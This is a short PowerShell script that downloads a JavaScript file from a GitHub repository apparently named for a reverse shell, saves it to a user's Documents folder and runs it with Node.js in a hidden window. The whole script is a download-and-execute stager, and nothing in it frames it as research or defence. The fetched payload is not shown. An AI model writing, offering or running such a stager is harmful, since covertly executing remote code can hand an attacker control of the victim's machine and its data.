# URL of the JavaScript file
$jsFileUrl = "https://github.com/ijas-mehabin/rev-shell/raw/main/part1.js"

# Path to save the downloaded file
$downloadPath = "C:\Users\HP\Documents\yourfile.js"

# Download the file
curl -Uri $jsFileUrl -OutFile $downloadPath

# Run the downloaded JavaScript file using Node.js
Start-Process "node" -ArgumentList $downloadPath -WindowStyle Hidden
